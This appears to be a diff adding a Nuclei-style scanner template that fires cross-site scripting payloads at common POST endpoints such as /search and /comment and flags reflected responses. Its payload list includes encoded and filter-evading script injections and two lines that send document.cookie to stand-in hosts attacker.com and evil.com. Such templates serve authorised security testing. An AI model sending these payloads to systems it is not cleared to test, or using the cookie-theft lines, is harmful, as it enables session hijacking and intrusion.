@@ -1,0 +1,135 @@
+id: post-xss
+
+info:
+  name: POST-based XSS Detection
+  author: custom
+  severity: high
+  description: Detects XSS vulnerability via POST request with various body parameters
+  tags: xss,post,reflected-xss,custom
+
+variables:
+  random: "{{1}}"
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/report"
+      - "{{BaseURL}}/submit"
+      - "{{BaseURL}}/search"
+      - "{{BaseURL}}/feedback"
+      - "{{BaseURL}}/comment"
+      - "{{BaseURL}}/contact"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+
+    body: "{{param}}={{payload}}"
+
+    payloads:
+      param:
+        - "path"
+        - "url"
+        - "name"
+        - "comment"
+        - "message"
+        - "content"
+        - "data"
+        - "input"
+        - "query"
+        - "text"
+
+      payload:
+        # Basic script injection
+        - '<script>alert({{random}})</script>'
+        - '<script>alert("XSS")</script>'
+        - '<script>alert(document.domain)</script>'
+        - '<script>alert(document.cookie)</script>'
+
+        # URL encoded variations
+        - '%3Cscript%3Ealert({{random}})%3C%2Fscript%3E'
+        - '%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E'
+
+        # Double encoded
+        - '%253Cscript%253Ealert({{random}})%253C%252Fscript%253E'
+
+        # Path injection patterns (like the example)
+        - '/intro%3Fname%3D%3Cscript%3Ealert({{random}})%3C%2Fscript%3E'
+        - '/page?param=%3Cscript%3Ealert({{random}})%3C%2Fscript%3E'
+
+        # Event handlers
+        - '<img src=x onerror=alert({{random}})>'
+        - '<img src=x onerror="alert({{random}})">'
+        - '<svg onload=alert({{random}})>'
+        - '<body onload=alert({{random}})>'
+
+        # HTML injection
+        - '<iframe src="javascript:alert({{random}})"></iframe>'
+        - '<iframe src=javascript:alert({{random}})></iframe>'
+
+        # Context breaking
+        - '"><script>alert({{random}})</script>'
+        - "'><script>alert({{random}})</script>"
+        - '</script><script>alert({{random}})</script>'
+
+        # Cookie exfiltration
+        - '<script>location.href="http://attacker.com?c="+document.cookie</script>'
+        - '<script>new Image().src="http://evil.com?"+document.cookie</script>'
+
+        # Other script variations
+        - '<scr<script>ipt>alert({{random}})</scr</script>ipt>'
+        - '<script>eval(atob("YWxlcnQoMSk="))</script>'
+        - '<script>setTimeout("alert({{random}})",0)</script>'
+
+        # Polyglot payloads
+        - 'javascript:alert({{random}})'
+        - 'javascript:alert(String.fromCharCode(88,83,83))'
+
+    attack: clusterbomb
+    stop-at-first-match: true
+
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        name: reflected-xss
+        dsl:
+          - 'contains(body, "<script>")'
+          - 'contains(body, "alert(")'
+          - 'status_code == 200'
+          - 'contains(content_type, "text/html")'
+        condition: and
+
+      - type: dsl
+        name: event-handler-reflection
+        dsl:
+          - 'contains(body, "onerror")'
+          - 'contains(body, "onload")'
+          - 'status_code == 200'
+          - 'contains(content_type, "text/html")'
+        condition: and
+
+      - type: dsl
+        name: iframe-injection
+        dsl:
+          - 'contains(body, "javascript:alert")'
+          - 'contains(body, "<iframe")'
+          - 'status_code == 200'
+          - 'contains(content_type, "text/html")'
+        condition: and
+
+      - type: dsl
+        name: html-tag-reflection
+        dsl:
+          - 'contains(body, "<img")'
+          - 'contains(body, "src=x")'
+          - 'status_code == 200'
+          - 'contains(content_type, "text/html")'
+        condition: and
+
+      - type: dsl
+        name: svg-injection
+        dsl:
+          - 'contains(body, "<svg")'
+          - 'contains(body, "alert(")'
+          - 'status_code == 200'
+          - 'contains(content_type, "text/html")'
+        condition: and
